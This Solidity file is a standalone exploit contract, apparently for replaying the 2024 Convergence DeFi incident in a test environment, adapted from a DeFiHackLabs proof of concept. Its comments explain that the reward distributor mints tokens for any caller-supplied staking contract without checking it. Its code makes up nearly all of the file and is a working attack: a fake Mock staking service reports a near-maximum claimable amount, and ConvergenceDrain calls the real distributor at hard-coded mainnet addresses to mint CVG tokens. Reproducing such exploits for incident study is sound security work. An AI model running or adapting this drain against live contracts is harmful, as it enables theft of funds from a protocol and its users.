// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-08-Convergence).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (`ContractTest.testExploit()`, with `attacker = address(this)`),
// deploying only a tiny helper `Mock` used as the fake "staking service". There
// is no standalone exploit contract to deploy for the entrypoint itself, so
// this contract folds the test's `testExploit()` body into `run()` and keeps
// the `Mock` sub-contract, exactly mirroring the original two-contract shape.
// Logic and constants are copied verbatim from test/Convergence_exp.sol.
//
// Root cause: CvxRewardDistributor.claimMultipleStaking() calls
// claimCvgCvxMultiple() on a CALLER-SUPPLIED contract array with no check that
// the contracts are registered staking services, then mints whatever amount
// the (possibly fake) contract reports as claimable — capped only by the
// token's remaining MAX_STAKING allocation.

interface ICommonStruct {
    struct TokenAmount {
        IERC20 token;
        uint256 amount;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface ICvxStakingPositionService {
    function claimCvgCvxMultiple(
        address account
    ) external returns (uint256, ICommonStruct.TokenAmount[] memory);
}

interface ICvxRewardDistributor {
    function claimMultipleStaking(
        ICvxStakingPositionService[] calldata claimContracts,
        address _account,
        uint256 _minCvgCvxAmountOut,
        bool _isConvert,
        uint256 cvxRewardCount
    ) external;
}

contract ConvergenceDrain {
    ICvxRewardDistributor constant cvxRewardDistributor =
        ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
    IERC20 constant CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    // step 0: deploy the fake "staking service" that will report a fabricated
    // claimable amount, then call the real distributor with it.
    function run() external {
        Mock mock = new Mock();

        ICvxStakingPositionService[] memory claimContracts = new ICvxStakingPositionService[](1);
        claimContracts[0] = ICvxStakingPositionService(address(mock));

        // step 1: the distributor loops over `claimContracts` (fully caller-
        // controlled) with no isStakingContract() check on each element, then
        // mints CVG.mintStaking(account, sum-of-reported-claimable).
        cvxRewardDistributor.claimMultipleStaking(claimContracts, address(this), 1, true, 1);
    }
}

// The fake staking-position-service. A REAL staking contract would compute the
// caller's actual accrued CVG; this one simply reports "everything up to
// uint256.max", which the distributor accumulates and mints without question.
contract Mock {
    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    function claimCvgCvxMultiple(
        address account
    ) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
        ICommonStruct.TokenAmount[] memory tokenAmount = new ICommonStruct.TokenAmount[](0);

        return (type(uint256).max - CVG.totalSupply(), tokenAmount);
    }
}
